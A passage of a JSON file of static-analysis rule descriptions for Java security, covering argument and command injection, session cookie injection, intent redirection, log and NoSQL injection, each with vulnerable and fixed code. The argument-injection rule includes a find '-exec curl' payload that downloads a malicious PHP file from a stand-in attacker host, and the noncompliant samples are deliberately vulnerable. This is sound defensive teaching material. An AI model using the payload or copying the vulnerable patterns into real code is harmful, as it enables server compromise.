not, these provide additional security mechanisms. Usually, these built-in\nmethods are engineered for internal page redirections. Thus, they might not be the solution for the reader’s use case.</p>\n<p>In case the application strictly requires external redirections based on user-controllable data, this could be done using the following\nalternatives:</p>\n<ol>\n  <li> Validating the <code>authority</code> part of the URL against a statically defined value (see Pitfalls). </li>\n  <li> Using an allow-list approach in case the destination URLs are multiple but limited. </li>\n  <li> Adding a customized page to which users are redirected, warning about the imminent action and requiring manual authorization to proceed. </li>\n</ol>\n<h3>Pitfalls</h3>\n<h4>The trap of 'StartsWith' and equivalents</h4>\n<p>When validating untrusted URLs by checking if they start with a trusted scheme and authority pair <code>scheme://authority</code>, <strong>ensure\nthat the validation string contains a path separator <code>/</code> as the last character</strong>.<br></p>\n<p>If the validation string does not contain a terminating path separator, the Open Redirect vulnerability remains; only the exploitation technique\nchanges.</p>\n<p>Thus, a validation like <code>startsWith(\"https://example.com\")</code> or an equivalent with the regex <code>^https://example\\.com.*</code> can be\nexploited with the following URL <code>https://example.com.malicious.io</code>. The practice of taking over domains that maliciously look like\nexisting domains is widespread and is called <a href=\"https://en.wikipedia.org/wiki/Cybersquatting\">Cybersquatting</a>.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/601\">CWE-601 - URL Redirection to Untrusted Site ('Open Redirect')</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "javasecurity:S5883": {
        "name": "OS commands should not be vulnerable to argument injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>OS command argument injections occur when applications allow the execution of operating system commands from untrusted data but the untrusted data\nis limited to the arguments.<br> It is not possible to directly inject arbitrary commands that compromise the underlying operating system, but the\nbehavior of the executed command still might be influenced in a way that allows to expand access, for example, execution of arbitrary commands. The\nsecurity of the application depends on the behavior of the application that is executed.</p>\n<h3>What is the potential impact?</h3>\n<p>An attacker exploiting an arguments injection vulnerability will be able to add arbitrary argument to a system binary call. Depending on the\ncommand the parameters are added to, this might lead to arbitrary command execution.</p>\n<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process runs with root privileges,\nand therefore any OS commands or programs may be affected.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Denial of service and data leaks</h4>\n<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>\n<p>An attacker could, for example:</p>\n<ul>\n  <li> download the internal server’s data, most likely to sell it </li>\n  <li> modify data, send malware </li>\n  <li> stop services or exhaust resources (with fork bombs for example) </li>\n</ul>\n<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>\n<h4>Root privilege escalation and pivot</h4>\n<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate\ntheir privileges to an administrative level and attacks other servers.</p>\n<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised\nby a combination of OS injections and <strong>misconfiguration</strong> of:</p>\n<ul>\n  <li> Docker or Kubernetes clusters </li>\n  <li> cloud services </li>\n  <li> network firewalls and routing </li>\n  <li> OS access control </li>\n</ul>\n<h2>How to fix it in Java SE</h2>\n<h3>Code examples</h3>\n<p>The following code uses the <code>find</code> command and expects the user to enter the name of a file to find on the system.</p>\n<p>It is vulnerable to argument injection because untrusted data is inserted in the arguments of a process call without prior validation or\nsanitization.<br> Here, the application ignores that a user-submitted parameter might contain special characters that will tamper with the expected\nsystem command behavior.</p>\n<p>In this particular case, an attacker might add arbitrary arguments to the <code>find</code> command for malicious purposes. For example, the\nfollowing payload will download malicious software on the application’s hosting server.</p>\n<pre>\n -exec curl -o /var/www/html/ http://evil.example.org/malicious.php ;\n</pre>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"noncompliant\">\n@Controller\npublic class ExampleController\n{\n    @GetMapping(value = \"/find\")\n    public void find(@RequestParam(\"filename\") String filename) throws IOException {\n\n        Runtime.getRuntime().exec(\"/usr/bin/find . -iname \" + filename);\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"compliant\">\n@Controller\npublic class ExampleController\n{\n    @GetMapping(value = \"/find\")\n    public void find(@RequestParam(\"filename\") String filename) throws IOException {\n\n        String cmd1[] = new String[] {\"/usr/bin/find\", \".\", \"-iname\", filename};\n        Process proc = Runtime.getRuntime().exec(cmd1); // Compliant\n    }\n}\n</pre>\n<p>java.lang.Runtime is sometimes used over java.lang.ProcessBuilder due to ease of use. Flexibility in methods often introduces security issues as\nedge cases are easily missed. The compliant solution logic is also applied to java.lang.ProcessBuilder.</p>\n<h3>How does this work?</h3>\n<p>Allowing users to insert data in operating system commands generally creates more problems than it solves.</p>\n<p>Anything that can be done via operating system commands can usually be done via a language’s native SDK.<br> Therefore, our suggestion is to avoid\nusing OS commands in the first place.</p>\n<p>Here <code>java.lang.Runtime.exec(String[] cmdarray)</code> takes care of escaping the passed arguments and internally creates a single string\ngiven to the operating system to be executed.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html\">OWASP, OS Command Injection Defense\n  Cheat Sheet</a> </li>\n  <li> <a href=\"https://gtfobins.github.io/#+shell\">GTFOBins, list of Unix binaries that can be used to bypass local security restrictions</a> </li>\n  <li> <a href=\"https://lolbas-project.github.io/#\">LOLBAS, list of Windows binaries that can be used to bypass local security restrictions</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/88\">CWE-88 - Argument Injection or Modification</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "javasecurity:S6287": {
        "name": "Applications should not create session cookies from untrusted input",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Session Cookie Injection occurs when a web application assigns session cookies to users using untrusted data.</p>\n<p>Session cookies are used by web applications to identify users. Thus, controlling these enable control over the identity of the users within the\napplication.</p>\n<p>The injection might occur via a GET parameter, and the payload, for example, <code><a\nhref=\"https://example.com?cookie=injectedcookie\">https://example.com?cookie=injectedcookie</a></code>, delivered using phishing techniques.</p>\n<h3>What is the potential impact?</h3>\n<p>A well-intentioned user opens a malicious link that injects a session cookie in their web browser. This forces the user into unknowingly browsing a\nsession that isn’t theirs.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Sensitive data disclosure</h4>\n<p>A victim introduces sensitive data within the attacker’s application session that can later be retrieved by them. This can lead to a variety of\nimplications depending on what type of data is disclosed. Strictly confidential user data or organizational data leakage have different impacts.</p>\n<h4>Vulnerability chaining</h4>\n<p>An attacker not only manipulates a user into browsing an application using a session cookie of their control but also successfully detects and\nexploits a self-XSS on the target application.<br> The victim browses the vulnerable page using the attacker’s session and is affected by the XSS,\nwhich can then be used for a wide range of attacks including credential stealing using mirrored login pages.</p>\n<h2>How to fix it in Java SE</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to Session Cookie Injection as it assigns a session cookie using untrusted data.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nprotected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n    Optional&lt;Cookie&gt; cookieOpt = Arrays.stream(request.getCookies())\n                                    .filter(c -&gt; c.getName().equals(\"jsessionid\"))\n                                    .findFirst();\n\n    if (!cookieOpt.isPresent()) {\n        String cookie = request.getParameter(\"cookie\");\n        Cookie cookieObj = new Cookie(\"jsessionid\", cookie);\n        response.addCookie(cookieObj);\n    }\n\n    response.sendRedirect(\"/welcome.jsp\");\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nprotected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n    Optional&lt;Cookie&gt; cookieOpt = Arrays.stream(request.getCookies())\n                                    .filter(c -&gt; c.getName().equals(\"jsessionid\"))\n                                    .findFirst();\n\n    if (!cookieOpt.isPresent()) {\n        response.sendRedirect(\"/getCookie.jsp\");\n    } else {\n        response.sendRedirect(\"/welcome.jsp\");\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>Untrusted data, such as GET or POST request content, should always be considered tainted. Therefore, an application should not blindly assign the\nvalue of a session cookie to untrusted data.</p>\n<p>Session cookies should be generated using the built-in APIs of secure libraries that include session management instead of developing homemade\ntools.<br> Often, these existing solutions benefit from quality maintenance in terms of features, security, or hardening, and it is usually better to\nuse these solutions than to develop your own.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/384\">CWE-384 - Session Fixation</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "javasecurity:S6384": {
        "name": "Components should not be vulnerable to intent redirection",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Intent redirection vulnerabilities occur when an application publicly exposes a feature that uses an externally provided intent to start a new\ncomponent.</p>\n<p>In that case, an application running on the same device as the affected one can launch the exposed, vulnerable component and provide it with a\nspecially crafted intent. Depending on the application’s configuration and logic, this intent will be used in the context of the vulnerable\napplication, which poses a security threat.</p>\n<h3>What is the potential impact?</h3>\n<p>An affected component that forwards a malicious externally provided intent does so using the vulnerable application’s context. In particular, the\nnew component is created with the same permissions as the application and without limitations on what feature can be reached.</p>\n<p>Therefore, an attacker exploiting an intent redirection vulnerability could manage to access a private application’s components. Depending on the\nfeatures privately exposed, this can lead to further exploitations, sensitive data disclosure, or even persistent code execution.</p>\n<h4>Information disclosure</h4>\n<p>An attacker can use the affected feature as a gateway to access other components of the vulnerable application, even if they are not exported. This\nincludes features that handle sensitive information.</p>\n<p>Therefore, by crafting a malicious intent and submitting it to the vulnerable redirecting component, an attacker can retrieve most data exposed by\nprivate features. This affects the confidentiality of information that is not protected by an additional security mechanism, such as an encryption\nalgorithm.</p>\n<h4>Attack surface increase</h4>\n<p>Because the attacker can access most components of the application, they can identify and exploit other vulnerabilities that would be present in\nthem. The actual impact depends on the nested vulnerability. Exploitation probability depends on the in-depth security level of the application.</p>\n<h4>Privilege escalation</h4>\n<p>If the vulnerable application has privileges on the underlying devices, an attacker exploiting the redirection issue might take advantage of them.\nFor example by crafting a malicious intent action, the attacker could be able to pass phone calls on behalf of the entitled application.</p>\n<p>This can lead to various attack scenarios depending on the exploited permissions.</p>\n<h4>Persistent code execution</h4>\n<p>A lot of applications rely on dynamic code loading to implement a variety of features, such as:</p>\n<ul>\n  <li> Minor feature updates. </li>\n  <li> Application package size reduction. </li>\n  <li> DRM or other code protection features. </li>\n</ul>\n<p>When a component exposes a dynamic code loading feature, an attacker could use it during the redirection’s exploitation to deploy malicious code\ninto the application. The component can be located in the application itself or one of its dependencies.</p>\n<p>Such an attack would compromise the application execution environment entirely and lead to multiple security threats. The malicious code could:</p>\n<ul>\n  <li> Intercept and exfiltrate all data used in the application. </li>\n  <li> Steal authentication credentials to third-party services. </li>\n  <li> Change the application’s behavior to serve another malicious purpose (phishing, ransoming, etc) </li>\n</ul>\n<p>Note that in most cases, the deployed malware can persist application or hosting device restarts.</p>\n<h2>How to fix it in Android</h2>\n<h3>Code examples</h3>\n<p>This code is vulnerable to intent injection attacks because it starts a new activity from a user-provided intent without prior validation.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class Noncompliant extends AppCompatActivity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        Intent intent = getIntent();\n        Intent forward = (Intent) intent.getParcelableExtra(\"anotherintent\");\n        startActivity(forward); // Noncompliant\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class MainActivity extends AppCompatActivity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n\n        Intent intent = getIntent();\n        Intent forward = (Intent) intent.getParcelableExtra(\"anotherintent\");\n\n        ComponentName name = forward.resolveActivity(getPackageManager());\n        if (name.getPackageName().equals(\"safePackage\") &amp;&amp;\n                name.getClassName().equals(\"safeClass\")) {\n            startActivity(forward);\n        }\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>In general, security best practices discourage forwarding intents. However, when the application requires such a feature, it should precisely check\nthe forwarded intents to ensure they do not pass malicious content.</p>\n<p>Additionally, the components that are not meant to be accessed externally should be marked as non-exported in the application’s manifest. This is\ndone by setting the <code>android:exported</code> attribute of the components to <code>\"false\"</code>.</p>\n<h4>Checking the intent destination</h4>\n<p>Most unintended usage of the forwarding feature can be prevented by verifying whether the destination package and class names belong to a list of\naccepted components.</p>\n<p>The allow-list of accepted destinations should only contain components that perform non-sensitive actions and handle non-sensitive data. Moreover,\nit should not allow reaching components that further redirect inner intents.</p>\n<p>The example compliant code uses the <code>resolveActivity</code> method of the inner intent to determine its target component. It then uses the\n<code>getPackageName</code> and <code>getClassName</code> methods to validate this destination is not sensitive.</p>\n<h4>Checking the intent origin</h4>\n<p>Before forwarding the intent, the application can check its origin. Verifying the origin package is trusted prevents the forwarding feature from\nbeing used by an external component.</p>\n<p>The <code>getCallingActivity</code> method of the forwarded intent can be used to determine the origin component.</p>\n<h4>Permissions downgrade</h4>\n<p>Before forwarding an intent to another component, the application can verify or remove the permissions set on the forwarded intent. In that case,\neven if the destination is a sensitive component, the application can ensure the untrusted intent will not be able to read or write sensitive data or\nlocations.</p>\n<p>In most cases, the application should drop the following permissions from untrusted intents:</p>\n<ul>\n  <li> FLAG_GRANT_READ_URI_PERMISSION </li>\n  <li> FLAG_GRANT_WRITE_URI_PERMISSION </li>\n</ul>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://support.google.com/faqs/answer/9267555?hl=en\">support.google.com</a> - Remediation for Intent Redirection Vulnerability <a\n  href=\"https://developer.android.com/topic/security/risks/intent-redirection\">developer.android.com</a> - Intent redirection </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x11-v6-interaction_with_the_environment\">Mobile AppSec\n  Verification Standard - Platform Interaction Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m1-improper-platform-usage\">Mobile Top 10 2016 Category M1 - Improper\n  Platform Usage</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "javasecurity:S2076": {
        "name": "OS commands should not be vulnerable to command injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>OS command injections occur when applications build command lines from untrusted data before executing them with a system shell.<br> In that case,\nan attacker can tamper with the command line construction and force the execution of unexpected commands. This can lead to the compromise of the\nunderlying operating system.</p>\n<h3>What is the potential impact?</h3>\n<p>An attacker exploiting an OS command injection vulnerability will be able to execute arbitrary commands on the underlying operating system.</p>\n<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process runs with root privileges,\nand therefore any OS commands or programs may be affected.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Denial of service and data leaks</h4>\n<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>\n<p>An attacker could, for example:</p>\n<ul>\n  <li> download the internal server’s data, most likely to sell it </li>\n  <li> modify data, send malware </li>\n  <li> stop services or exhaust resources (with fork bombs for example) </li>\n</ul>\n<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>\n<h4>Root privilege escalation and pivot</h4>\n<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate\ntheir privileges to an administrative level and attacks other servers.</p>\n<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised\nby a combination of OS injections and <strong>misconfiguration</strong> of:</p>\n<ul>\n  <li> Docker or Kubernetes clusters </li>\n  <li> cloud services </li>\n  <li> network firewalls and routing </li>\n  <li> OS access control </li>\n</ul>\n<h2>How to fix it in Apache Commons</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to command injections because it is using untrusted inputs to set up a new process. Therefore an attacker can\nexecute an arbitrary program that is installed on the system.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n@Controller\npublic class ExampleController\n{\n    @GetMapping(value = \"/exec\")\n    public void exec(@RequestParam(\"command\") String command) throws IOException {\n\n        CommandLine cmd = new CommandLine(command);\n        DefaultExecutor executor = new DefaultExecutor();\n        executor.execute(cmd);\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n@Controller\npublic class ExampleController\n{\n    @GetMapping(value = \"/exec\")\n    public void exec(@RequestParam(\"command\") String command) throws IOException {\n\n        List&lt;String&gt; allowedCmds = new ArrayList&lt;String&gt;();\n        allowedCmds.add(\"/bin/ls\");\n        allowedCmds.add(\"/bin/cat\");\n\n        if (allowedCmds.contains(command)){\n            CommandLine cmd = new CommandLine(command);\n            DefaultExecutor executor = new DefaultExecutor();\n            executor.execute(cmd);\n        }\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>Allowing users to execute operating system commands generally creates more problems than it solves.</p>\n<p>Anything that can be done via operating system commands can usually be done via a language’s native SDK.<br> Therefore, our first suggestion is to\navoid using OS commands in the first place.<br> However, if the application requires running OS commands with user-controlled data, here are some\nsecurity suggestions.</p>\n<h4>Pre-Approved commands</h4>\n<p>If the application aims to execute only a small number of OS commands (for example, <code>ls</code>, <code>pwd</code>, and <code>grep</code>), the\ncleanest way to avoid this problem is to validate the input before using it in an OS command.</p>\n<p>Create a list of authorized and secure commands that you want the application to be able to execute. Use absolute paths to avoid any ambiguity.<br>\nIf a user input does not match an entry in this list, it should be rejected because it is considered unsafe.</p>\n<p>Depending on the number of commands you want the application to support, the list can be either a regex string or any array type. If you use\nregexes, choose simple regexes to avoid ReDOS attacks. For example, you can accept only a specific set of executables, by using\n<code>^/bin/(ls|pwd|grep)$</code>.</p>\n<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>\n<h4>Neutralize special characters</h4>\n<p>If the application is to execute complex commands that cannot be controlled thanks to pre-approved lists, the cleanest approach is to use special\nsanitization components, such as <code>org.apache.commons.exec.CommandLine.addArguments(String[] addArguments)</code>.</p>\n<p>The library helps you to get rid of common dangerous characters, such as:</p>\n<ul>\n  <li> <code>&amp;</code> </li>\n  <li> <code>|</code> </li>\n  <li> <code>;</code> </li>\n  <li> <code>$</code> </li>\n  <li> <code>&gt;</code> </li>\n  <li> <code>&lt;</code> </li>\n  <li> <code>`</code> </li>\n  <li> <code>\\</code> </li>\n  <li> <code>!</code> </li>\n</ul>\n<p>If user input is to be included in the arguments of a command, the application must ensure that dangerous options or argument delimiters are\nneutralized.<br> Argument delimiters count <code>'</code>, <code>-</code> and spaces.</p>\n<p>For example, the <code>find</code> command from UNIX supports the dangerous argument <code>-exec</code>.<br> In this case, option processing can be\nterminated with a string containing <code>--</code> or with special options. For example, <code>git</code> supports <code>--end-of-options</code> <a\nhref=\"https://github.blog/2019-11-03-highlights-from-git-2-24/#tidbits\">since its version 2.24</a>.</p>\n<p>Here <code>org.apache.commons.exec.CommandLine.addArguments(String[] addArguments)</code> takes care of escaping the passed arguments and\ninternally creates a single string given to the operating system to be executed.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html\">OWASP, OS Command Injection Defense\n  Cheaty Sheet</a> </li>\n  <li> <a href=\"https://gtfobins.github.io/#+shell\">GTFOBins, list of Unix binaries that can be used to bypass local security restrictions</a> </li>\n  <li> <a href=\"https://lolbas-project.github.io/#\">LOLBAS, list of Windows binaries that can be used to bypass local security restrictions</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/78\">CWE-78 - Improper Neutralization of Special Elements used in an OS Command</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "javasecurity:S5145": {
        "name": "Logging should not be vulnerable to injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Log injection occurs when an application fails to sanitize untrusted data used for logging.</p>\n<p>An attacker can forge log content to prevent an organization from being able to trace back malicious activities.</p>\n<h3>What is the potential impact?</h3>\n<p>If an attacker can insert arbitrary data into a log file, the integrity of the chain of events being recorded can be compromised.<br> This\nfrequently occurs because attackers can inject the log entry separator of the logger framework, commonly newlines, and thus insert artificial log\nentries. <br> Other attacks could also occur requiring only field pollution, such as cross-site scripting (XSS) or code injection (for example,\nLog4Shell) if the logged data is fed to other application components, which may interpret the injected data differently.<br></p>\n<p>The focus of this rule is newline character replacement.</p>\n<h4>Log Forge</h4>\n<p>An attacker, able to create independent log entries by injecting log entry separators, inserts bogus data into a log file to conceal his malicious\nactivities. This obscures the content for an incident response team to trace the origin of the breach as the indicators of compromise (IoCs) lead to\nfake application events.</p>\n<h2>How to fix it in Java SE</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to log injection as it constructs log entries using untrusted data. An attacker can leverage this to manipulate\nthe chain of events being recorded.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nprivate static final Logger logger = Logger.getLogger(\"Logger\");\n\nprotected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n\n  String data = request.getParameter(\"data\");\n  if(data != null){\n    logger.log(Level.INFO, \"Data: {0} \", data);\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nprivate static final Logger logger = Logger.getLogger(\"Logger\");\n\nprotected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n\n  String data = request.getParameter(\"data\");\n  if(data != null){\n    data = data.replaceAll(\"[\\n\\r]\", \"_\");\n    logger.log(Level.INFO, \"Data: {0} \", data);\n  }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>Data used for logging should be content-restricted and typed. This can be done by validating the data content or sanitizing it.<br> Validation and\nsanitization mainly revolve around preventing carriage return (CR) and line feed (LF) characters. However, further actions could be required based on\nthe application context and the logged data usage.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/\">Top 10 2021 Category A9 - Security Logging and\n  Monitoring Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring\">Top 10 2017 Category A10 -\n  Insufficient Logging &amp; Monitoring</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/117\">CWE-117 - Improper Output Neutralization for Logs</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "javasecurity:S5147": {
        "name": "NoSQL operations should not be vulnerable to injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>NoSQL injections occur when an application retrieves untrusted data and inserts it into a database query without sanitizing it first.</p>\n<h3>What is the potential impact?</h3>\n<p>In the context of a web application that is vulnerable to NoSQL injection:<br> After discovering the injection point, attackers insert data into\nthe vulnerable field to execute malicious commands in the affected databases.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Identity spoofing and data leakage</h4>\n<p>In the context of simple query logic breakouts, a malicious database query enables privilege escalation or direct data leakage from one or more\ndatabases.<br> This threat is the most widespread impact.</p>\n<h4>Data deletion and denial of service</h4>\n<p>The malicious query makes it possible for the attacker to delete data in the affected databases.<br> This threat is particularly insidious if the\nattacked organization does not maintain a disaster recovery plan (DRP) as missing data can disrupt the regular operations of an organization.</p>\n<h4>Chaining NoSQL injections with other vulnerabilities</h4>\n<p>Attackers who exploit NoSQL injections rely on other vulnerabilities to maximize their profits.<br> Most of the time, organizations overlook some\ndefense in depth measures because they assume attackers cannot reach certain points in the infrastructure. This misbehavior can lead to multiple\nattacks with great impact:</p>\n<ul>\n  <li> When secrets are stored unencrypted in databases: Secrets can be exfiltrated and lead to compromise of other components. </li>\n  <li> If server-side OS and/or database permissions are misconfigured, injection can lead to remote code execution (RCE). </li>\n</ul>\n<h2>How to fix it in Legacy Mongo Java API</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to NoSQL injections because untrusted data is concatenated to the <code>$where</code> operator. This operator\nindicates to the backend that the expression needs to be interpreted, resulting in code injection.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport com.mongodb.MongoClient;\nimport com.mongodb.DB;\nimport com.mongodb.DBCollection;\nimport com.mongodb.BasicDBObject;\n\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) throws UnknownHostException\n{\n    String input = req.getParameter(\"input\");\n\n    MongoClient mongoClient = new MongoClient();\n    DB database             = mongoClient.getDB(\"ExampleDatabase\");\n    DBCollection collection = database.getCollection(\"exampleCollection\");\n    BasicDBObject query     = new BasicDBObject();\n\n    query.append(\"$where\", \"this.field == \\\"\" + input + \"\\\"\");\n\n    collection.find(query);\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport com.mongodb.MongoClient;\nimport com.mongodb.DB;\nimport com.mongodb.DBCollection;\nimport com.mongodb.BasicDBObject;\n\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) throws UnknownHostException\n{\n    String input = req.getParameter(\"input\");\n\n    MongoClient mongoClient = new MongoClient();\n    DB database             = mongoClient.getDB(\"ExampleDatabase\");\n    DBCollection collection = database.getCollection(\"exampleCollection\");\n    BasicDBObject query     = new BasicDBObject();\n\n    query.append(\"field\", input);\n\n    collection.find(query);\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Pre-approved list</h4>\n<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of the\ninitially intended logic.</p>\n<p>For NoSQL injections, the cleanest way to do so is to validate the input before using it in a query.</p>\n<p>Create a list of authorized and secure strings that you want the application to be able to use in a query.<br> If a user input does not match an\nentry in this list, it should be rejected because it is considered unsafe.</p>\n<p>The list can be either a regex string, an array, or validators on specific ranges of characters. If you use regexes, choose simple regexes to avoid\nReDOS attacks.</p>\n<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>\n<h4>Operators are to be classified as dangerous</h4>\n<p>As a rule of thumb if no operators are needed, you should generally reject user input containing them. If some operators are necessary, you should\nrestrict their use.</p>\n<p>Some operators execute JavaScript, and their use should be restricted for both untrusted input and internal code.<br> These operators include:</p>\n<ul>\n  <li> <code>$where</code> </li>\n  <li> <code>$function</code> </li>\n  <li> <code>$accumulator</code> </li>\n  <li> <code>mapReduce</code> </li>\n</ul>\n<p>Depending on your use case, you should first try using regular API calls before using any of these operators.<br> For example, using a\n<code>$where</code> operator is unnecessarily complex when only a simple search is required. It also leads to performance problems.</p>\n<p><strong>Note</strong>: <a href=\"https://www.mongodb.com/docs/manual/reference/operator/query/where/#javascript-enablement\">Server-side scripting\ncan be disabled</a>.</p>\n<p>Regular operators can also lead to data leaks.<br> For example, attackers can use \"comparison query operators\" in their attack data to trick the\nbackend database into giving hints about sensitive information or entirely giving it out.</p>\n<p>In the previous example, the untrusted data doesn’t need validation for its use case. Moving it out of a <code>$where</code> expression into a\nproper field query is 